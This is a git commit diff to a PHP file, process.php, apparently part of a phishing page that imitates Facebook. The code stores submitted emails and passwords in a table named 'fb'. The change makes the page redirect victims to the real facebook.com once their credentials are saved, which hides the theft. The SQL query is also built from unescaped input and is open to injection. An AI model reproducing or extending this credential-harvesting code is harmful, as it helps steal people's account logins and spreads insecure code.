ce13bd1fd8f0eba5366ad0b8cc2a2a8537eb2521
nkyadav4598 <nkrajkumar4598@gmail.com>
2017-10-25 16:34:43 +0530

    error3

--- process.php
+++ process.php
@@ -14,7 +14,7 @@ mysqli_query($connect,"INSERT INTO fb (uid,pass)
 		        VALUES ('$email','$password')");
 				
 	if(mysqli_affected_rows($connect) > 0){
-	echo "<a href=\"index.php\">Go Back</a>";
+	header("Location: https://www.facebook.com/");
 } else {
 	echo mysqli_error ($connect);
 }
